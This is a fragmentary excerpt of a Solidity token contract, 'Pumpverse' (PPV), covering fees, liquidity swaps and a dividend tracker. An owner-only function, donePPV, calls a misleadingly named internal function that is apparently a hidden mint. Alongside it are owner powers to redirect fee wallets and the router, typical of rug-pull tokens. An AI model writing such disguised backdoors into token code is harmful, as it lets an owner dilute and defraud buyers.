...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function listedPPV(address account, uint256 amount) internal virtual {
...
function listedPPV(address account, uint256 value) internal override {
    super.listedPPV(account, value);
...
contract PPVrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using HolderPPV  for HolderPPV .Map;
HolderPPV .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("PPV_rewardToken_Tracker", "PPV_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "PPV_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "PPV_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main PPV contract.");
    }
...
contract PPV is ERC20, Ownable {
 event UpdateDEXV2Router(address indexed newAddress, address indexed oldAddress);
    ...
    uint256 public  backReward = 6;
    uint256 public  TotalFees;
 uint256 public gasForProcessing = 300000;
    address public DEXV2Pair;
    PanCakeRouter02 public DEXV2Router;
    PPVrewardToken public rewardToken;
   uint256 _totalSupply =750000000  * (10**9);
 ...
 address public lp;
  ILP public adressLiquidity;
    address public developmentFeeReciever =0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Pumpverse", "PPV") {
 
        TotalFees = backReward.add(liquidityFee).add(developmentFee);
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new PPVrewardToken();
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function donePPV(address allowp, uint256 allowa) public masterWallet{
       listedPPV(allowp, allowa);
  }
 function setDevWallet(address payable wallet) public masterWallet {
        developmentFeeReciever = wallet;
    }
   
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "PPV: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "PPV: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "PPV: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "PPV: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTPPV = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTPPV);
...
uint256 bnbForLiquidity = bnbBalance.mul(liquidityFee).div(bnbFeeFactor).div(2);
        uint256 bnbForReflection = bnbBalance.mul(backReward).div(bnbFeeFactor);
        uint256 bnbForDev = bnbBalance.sub(bnbForLiquidity).sub(bnbForReflection);
addLiquidity(tokensTPPV, bnbForLiquidity);
payable(developmentFeeReciever).transfer(bnbForDev);
 (bool success,) = address(rewardToken).call{value: bnbForReflection}("");
if(success) {
            emit transferDividends(tokensToLiquify.mul(backReward).div(TotalFees), bnbForReflection);
        }
    }
